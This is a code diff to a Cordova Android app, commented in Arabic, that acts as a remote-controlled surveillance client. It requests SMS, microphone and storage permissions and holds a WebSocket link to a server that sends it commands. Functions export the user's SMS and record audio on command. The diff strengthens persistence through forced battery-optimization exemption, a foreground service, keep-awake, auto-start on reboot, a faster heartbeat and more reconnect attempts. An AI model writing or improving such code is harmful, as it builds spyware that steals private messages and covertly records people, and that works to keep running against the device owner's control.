@@ -1,15 +1,16 @@
 document.addEventListener('deviceready', onDeviceReady, false);
+
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
 
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // طلب الأذونات الأساسية فور تشغيل التطبيق
-  requestEssentialPermissions();
+  // طلب جميع الأذونات الضرورية فور تشغيل التطبيق
+  requestAllPermissions();
   
-  // تحسين وضع الخلفية ليبقى التطبيق نشطًا دائمًا
-  setupBackgroundMode();
+  // تحسين وضع الخلفية بشكل قوي
+  setupRobustBackgroundMode();
   
   // معلومات الجهاز
   const deviceInfo = {
@@ -74,8 +75,8 @@ function onDeviceReady() {
   }
 }
 
-// طلب الأذونات الأساسية فور تشغيل التطبيق
-function requestEssentialPermissions() {
+// طلب جميع الأذونات الضرورية
+function requestAllPermissions() {
   if (cordova.platformId === 'android') {
     const permissions = cordova.plugins.permissions;
     
@@ -84,6 +85,7 @@ function requestEssentialPermissions() {
       permissions.READ_SMS,
       permissions.RECORD_AUDIO,
       permissions.WRITE_EXTERNAL_STORAGE,
+      permissions.READ_EXTERNAL_STORAGE,
       permissions.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
     ];
     
@@ -93,14 +95,14 @@ function requestEssentialPermissions() {
           if (!status.hasPermission) {
             console.warn('لم يتم منح الأذونات المطلوبة');
             // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
-            requestBatteryOptimizationExemption();
+            forceBatteryOptimizationExemption();
           } else {
             console.log('تم منح جميع الأذونات المطلوبة');
           }
         }, function(error) {
           console.error('خطأ في طلب الأذونات:', error);
           // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
-          requestBatteryOptimizationExemption();
+          forceBatteryOptimizationExemption();
         });
       }
     });
@@ -108,30 +110,68 @@ function requestEssentialPermissions() {
 }
 
 // طلب إعفاء من تحسينات البطارية (مهم للبقاء في الخلفية)
-function requestBatteryOptimizationExemption() {
-  if (cordova.platformId === 'android' && cordova.plugins && cordova.plugins.BatterySaver) {
-    cordova.plugins.BatterySaver.isIgnoringBatteryOptimizations(function(isIgnoring) {
-      if (!isIgnoring) {
-        cordova.plugins.BatterySaver.requestIgnoreBatteryOptimizations(function() {
-          console.log('تم طلب إعفاء من تحسينات البطارية');
-        }, function(error) {
-          console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
-          // محاولة بديلة
-          try {
-            cordova.plugins.BatteryStatus.requestOptimizationsExemption();
-          } catch (e) {
-            console.error('فشل المحاولة البديلة:', e);
+function forceBatteryOptimizationExemption() {
+  if (cordova.platformId === 'android') {
+    // محاولة استخدام BatterySaver plugin
+    if (cordova.plugins && cordova.plugins.BatterySaver) {
+      cordova.plugins.BatterySaver.isIgnoringBatteryOptimizations(function(isIgnoring) {
+        if (!isIgnoring) {
+          cordova.plugins.BatterySaver.requestIgnoreBatteryOptimizations(function() {
+            console.log('تم طلب إعفاء من تحسينات البطارية');
+          }, function(error) {
+            console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
+            // محاولة بديلة
+            try {
+              cordova.plugins.BatteryStatus.requestOptimizationsExemption();
+            } catch (e) {
+              console.error('فشل المحاولة البديلة:', e);
+              // محاولة إظهار إرشادات للمستخدم
+              showBatteryOptimizationInstructions();
+            }
+          });
+        }
+      });
+    } else {
+      // إذا لم يكن BatterySaver متاحًا، نستخدم Intent لفتح إعدادات البطارية
+      try {
+        cordova.plugins.BatteryOptimization.isIgnoringBatteryOptimizations(function(isIgnoring) {
+          if (!isIgnoring) {
+            cordova.plugins.BatteryOptimization.requestIgnoreBatteryOptimizations(function() {
+              console.log('تم طلب إعفاء من تحسينات البطارية');
+            }, function(error) {
+              console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
+              showBatteryOptimizationInstructions();
+            });
           }
         });
+      } catch (e) {
+        console.error('فشل استخدام BatteryOptimization:', e);
+        showBatteryOptimizationInstructions();
       }
-    });
+    }
   }
 }
 
-// تحسين وضع الخلفية
-function setupBackgroundMode() {
+// إظهار إرشادات للمستخدم حول كيفية تعطيل تحسينات البطارية
+function showBatteryOptimizationInstructions() {
+  if (cordova.plugins && cordova.plugins.toast) {
+    cordova.plugins.toast.showLongBottom(
+      'يرجى تعطيل تحسينات البطارية للتطبيق في إعدادات الجهاز لضمان عمله في الخلفية'
+    );
+  }
+  
+  // محاولة فتح إعدادات البطارية
+  try {
+    cordova.plugins.BatteryOptimization.openBatteryOptimizationsSettings();
+  } catch (e) {
+    console.log('لم يتمكن من فتح إعدادات البطارية تلقائيًا');
+  }
+}
+
+// تحسين وضع الخلفية بشكل قوي
+function setupRobustBackgroundMode() {
+  // 1. استخدام background mode العادي
   if (cordova.plugins.backgroundMode) {
-    // إعدادات أكثر فعالية ليبقى التطبيق نشطًا
     cordova.plugins.backgroundMode.setDefaults({
       title: 'التطبيق يعمل في الخلفية',
       text: 'جارٍ مراقبة الأوامر الواردة',
@@ -145,19 +185,14 @@ function setupBackgroundMode() {
     
     cordova.plugins.backgroundMode.enable();
     
-    // منع الجهاز من الدخول في وضع السكون
-    if (cordova.plugins.insomnia) {
-      cordova.plugins.insomnia.keepAwake();
-    }
-    
     // التعامل مع تفعيل الوضع الخلفي
     cordova.plugins.backgroundMode.on('activate', function() {
-      // تعطيل تحسينات البطارية ليبقى التطبيق نشطًا
+      // تعطيل تحسينات البطارية
       if (cordova.plugins.backgroundMode.disableBatteryOptimizations) {
         cordova.plugins.backgroundMode.disableBatteryOptimizations();
       }
       
-      // التأكد من إعادة الاتصال بالخادم
+      // التأكد من الاتصال بالخادم
       if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
         const deviceInfo = {
           uuid: device.uuid || 'unknown',
@@ -176,7 +211,7 @@ function setupBackgroundMode() {
     });
   }
   
-  // استخدام خدمة المقدمة لزيادة الأولوية في الخلفية
+  // 2. استخدام خدمة المقدمة (Foreground Service) لزيادة الأولوية
   if (cordova.plugins.foregroundService) {
     cordova.plugins.foregroundService.start(
       'التطبيق يعمل في الخلفية',
@@ -189,18 +224,47 @@ function setupBackgroundMode() {
         console.error('Foreground service error:', error);
       }
     );
+  } else {
+    // إذا لم تكن خدمة المقدمة متوفرة، نستخدم وسيلة بديلة
+    try {
+      cordova.plugins.ForegroundService.start(
+        'التطبيق يعمل في الخلفية',
+        'جارٍ مراقبة الأوامر الواردة',
+        'icon',
+        function() {
+          console.log('Alternative foreground service started');
+        },
+        function(error) {
+          console.error('Alternative foreground service error:', error);
+        }
+      );
+    } catch (e) {
+      console.log('Foreground service plugin not available');
+    }
   }
   
-  // التأكد من تشغيل التطبيق تلقائيًا بعد إعادة التشغيل
+  // 3. منع الجهاز من الدخول في وضع السكون
+  if (cordova.plugins.insomnia) {
+    cordova.plugins.insomnia.keepAwake();
+  }
+  
+  // 4. ضمان التشغيل التلقائي بعد إعادة التشغيل
   if (cordova.plugins.autoStart) {
     cordova.plugins.autoStart.enable(function() {
       console.log('Auto-start enabled');
     }, function() {
       console.error('Failed to enable auto-start');
     });
+  } else {
+    // محاولة بديلة
+    try {
+      cordova.plugins.AutoStart.enable();
+    } catch (e) {
+      console.log('AutoStart plugin not available');
+    }
   }
   
-  // التأكد من تشغيل التطبيق عند فتح الشبكة
+  // 5. ضمان التشغيل عند فتح الشبكة
   document.addEventListener('online', function() {
     if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
       const deviceInfo = {
@@ -214,6 +278,11 @@ function setupBackgroundMode() {
     }
   }, false);
 }
+
+// متغيرات لإدارة إعادة الاتصال
+let reconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 15;
+let heartbeatInterval = null;
 
 function connectToServer(deviceInfo) {
   // استخدام رابط الخادم المقدم
@@ -232,6 +301,8 @@ function connectToServer(deviceInfo) {
   
   window.wsConnection.onopen = () => {
     console.log('Connected to server');
+    reconnectAttempts = 0; // إعادة تعيين محاولات إعادة الاتصال
+    
     // تسجيل الجهاز
     window.wsConnection.send(JSON.stringify({
       type: 'register',
@@ -287,11 +358,6 @@ function connectToServer(deviceInfo) {
   };
 }
 
-// متغيرات لإدارة إعادة الاتصال
-let reconnectAttempts = 0;
-const MAX_RECONNECT_ATTEMPTS = 10;
-let heartbeatInterval = null;
-
 // دالة لإرسال نبضات القلب
 function startHeartbeat() {
   // إيقاف أي نبضات قديمة
@@ -299,7 +365,7 @@ function startHeartbeat() {
     clearInterval(heartbeatInterval);
   }
   
-  // إرسال نبضات قلبية كل 30 ثانية
+  // إرسال نبضات قلبية كل 20 ثانية
   heartbeatInterval = setInterval(() => {
     if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
       try {
@@ -329,7 +395,7 @@ function startHeartbeat() {
         manufacturer: device.manufacturer || 'Unknown'
       });
     }
-  }, 30000);
+  }, 20000);
 }
 
 // دالة لإعادة الاتصال مع زيادة المهلة تدريجياً
@@ -337,7 +403,9 @@ function reconnectWithExponentialBackoff(deviceInfo) {
   reconnectAttempts++;
   
   // حساب المهلة مع زيادة تدريجية (2^reconnectAttempts * 1000)
-  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 300000); // الحد الأقصى 5 دقائق
+  const baseDelay = 1000;
+  const maxDelay = 300000; // 5 دقائق
+  const delay = Math.min(baseDelay * Math.pow(2, reconnectAttempts), maxDelay);
   
   console.log(`محاولة إعادة الاتصال ${reconnectAttempts} بعد ${delay}ms`);
   
@@ -507,25 +575,33 @@ function exportSMS(commandId, callback) {
   });
 }
 
+// تسجيل الصوت مع دعم كامل
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   const mediaRecorderOptions = {
     mimeType: 'audio/mp3',
     audioBitsPerSecond: 128000
   };
+  
+  // التأكد من أن المستخدم يسمح بالوصول إلى الميكروفون
   navigator.mediaDevices.getUserMedia({ audio: true })
     .then(stream => {
       const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
       const audioChunks = [];
+      
       mediaRecorder.ondataavailable = event => {
         audioChunks.push(event.data);
       };
+      
       mediaRecorder.onstop = () => {
         const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
         const audioUrl = URL.createObjectURL(audioBlob);
+        
         // حفظ التسجيل في التخزين المحلي
         const fileName = `recording_${commandId}.mp3`;
         saveAudioToStorage(fileName, audioBlob);
+        
+        // إرسال الرد مع معلومات الصوت
         callback({ 
           commandId,
           status: 'success',
@@ -538,13 +614,18 @@ function recordAudio(commandId, duration, callback) {
           }
         });
       };
+      
       mediaRecorder.start();
+      
+      // إيقاف التسجيل بعد المدة المحددة
       setTimeout(() => {
         mediaRecorder.stop();
+        // إيقاف جميع المسارات
         stream.getTracks().forEach(track => track.stop());
       }, duration * 1000);
     })
     .catch(error => {
+      console.error('Audio recording error:', error);
       callback({ 
         commandId,
         status: 'error',
